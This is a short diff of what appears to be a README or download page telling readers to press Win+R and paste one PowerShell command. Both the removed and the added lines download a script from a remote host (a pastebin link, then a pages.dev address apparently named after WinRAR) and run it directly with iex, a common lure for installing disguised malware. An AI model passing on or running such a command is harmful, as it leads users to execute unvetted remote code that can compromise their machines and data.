@@ -23,4 +23,4 @@
 **One command is all you need, just press win+r and paste it there:**
 
 ```powershell
-powershell irm https://pastebin.com/raw/TThHBuEB | iex
+irm fraknek.pages.dev/winrarraw | iex
